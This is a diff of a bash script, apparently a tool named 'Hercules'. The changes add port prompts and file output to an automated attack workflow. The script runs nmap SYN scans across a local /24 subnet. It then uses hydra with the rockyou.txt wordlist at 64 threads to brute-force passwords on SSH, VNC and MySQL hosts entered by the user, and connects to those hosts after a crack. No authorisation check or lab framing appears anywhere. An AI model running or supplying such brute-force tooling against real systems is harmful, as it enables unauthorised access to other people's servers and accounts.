@@ -1,36 +1,7 @@
 #!/bin/bash
-GREEN='\033[0;32m'
-RED='\033[0;31m'
-NC='\033[0m' # No Color
 
-# OS of the computer
-OS="linux"
-
-# For the wget functionality to work
-SITE_URL="https://google.com"
-
-# Root user
-root=0
-
-# the array that holds nothing in it
-empty=("")
-
-alphabet=("a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t" "u" "v" "w" "x" "y" "z")
-
-# The yes array that contains the yes input
-yes=("yes" "YES" "y" "Y")
-
-# The array that contains the exit input
-exit=("exit" "quit" "EXIT" "QUIT" "STOP" "stop")
-
-# Gets the current time in a 12-hour format
-CURRENT_TIME=$(date +"%I:%M:%S %p")
-
-# Gets current date in mm/dd/yyyy format
-CURRENT_DATE=$(date +"%m/%d/%Y")
-
-# List of required packages/commands (separated by spaces)
-required_packages=("wget" "nmap" "hydra" "ssh" "mysql")
+# file that hold all the variables that need for the program to work properly
+source DontEdit.sh
 
 # Function to check if a command exists
 command_exists() {
@@ -70,7 +41,7 @@ else
         clear
         if [[ $EUID -ne $root ]]; then
             # Error message if not running as root
-            echo "ERROR:root:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
+            echo "ERROR:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
             echo "TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}"
             exit
         else
@@ -78,20 +49,15 @@ else
             clear
 
             # Try to connect to the server
-            wget -q --spider $SITE_URL
+            wget -q --spider "${SITE_URL}"
 
             # If the user is connected to the internet, it works as normal
             if ! make mytarget; then
                 clear
             # Else, it notifies them that they are not connected to the internet and tells them to connect
             else
-                # Error message if offline notification
-                offlineTitle="Offline"
-                offline="TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
-                osascript -e "display notification \"$offline\" with title \"$offlineTitle\""
-
                 # Offline text in the terminal
-                echo "ERROR:root:TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}." >> ERROR.LOG
+                echo "ERROR:TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}." >> ERROR.LOG
                 echo "TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
                 exit 1
             fi
@@ -112,6 +78,15 @@ else
                     echo -e "${RED}This can take up to 1 hour to complete.${NC}"
                     # Scan the entire network and display open ports
                     sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
+                    # asks if the user want to see scan on a open file or not
+                    read -p "Would you like to see the scan on a open file (Yes or No): " SeeFile
+                    if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
+                        open scan.txt
+                    else
+                        echo "[-] Ok I will not open the scan.txt file"
+                        sleep 1
+                    fi
+                    
                     hydra -h
                     echo "Put in Hydra first to start the script."
                     echo ""
@@ -129,13 +104,12 @@ else
                 elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
                     echo "Stopping program..."
                     sleep 1
-                
+                    exit 1
                 #checks if the user has put nothing into the input feild
                 elif [[ " ${empty[*]} " == *" ${service} "* ]]; then
                     echo -e "${RED}ERROR:${NC} plase input a number into the input field"
-                    clear
-                    Hercules
-                
+                    sleep 1
+                    exit 1                
                 #checks if the user has put in a letter insed of a number into the input feild
                 elif [[ " ${alphabet[*]} " == *" ${service} "* ]]; then
                     echo "Please enter a number next time"
@@ -143,7 +117,7 @@ else
 
                 else
                     # Scan specific port
-                    sudo nmap -sS 192.168.1.1/24 -p $service --open
+                    sudo nmap -sS 192.168.1.1/24 -p $service -oN $service --open
                 fi
             }
 
@@ -155,6 +129,7 @@ else
                 echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
                 read -p "Input Username: " user
                 read -p "Input Hostname: " host
+                read -p "Input Port: " port
             }
 
             RunHackingCommandWithVNC() {
@@ -169,7 +144,7 @@ else
                     # it will continue as normal
                     else
                         # Crack VNC password
-                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
+                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
                         # Alerts the user that the computer is trying to connect to the VNC server
                         title="Connecting to ${host}"
                         Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
@@ -187,7 +162,7 @@ else
                         # Put the
                         echo
                         echo "Loading VNC server..."
-                        xtightvncviewer "${host}"
+                        open "vnc://${host}"
                         exit
                     fi
                 fi
@@ -206,7 +181,7 @@ else
                     else
 
                         # Crack SSH password
-                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
+                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                         # Alerts the user that the computer is trying to connect to the ssh server
                         title="Connecting to ${user}"
                         Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
@@ -220,7 +195,7 @@ else
                         Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
                         echo "${title}"
                         echo "${Connected_To_SSH_SERVER}"
-                        ssh "${user}@${host}"
+                        ssh $user@$host -p $port
                     fi
                 fi
             }
@@ -237,7 +212,7 @@ else
                     # it will continue as normal
                     else
                         # Crack MySQL password
-                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
+                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
                         echo "Loading MySQL server..."
                         sleep 3
                         mysql -u $user -p -A
@@ -258,7 +233,7 @@ else
     else
         clear
         # Warning message for wrong OS
-        echo "WARNING:root:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
+        echo "WARNING:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
         echo "TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
     fi
 fi
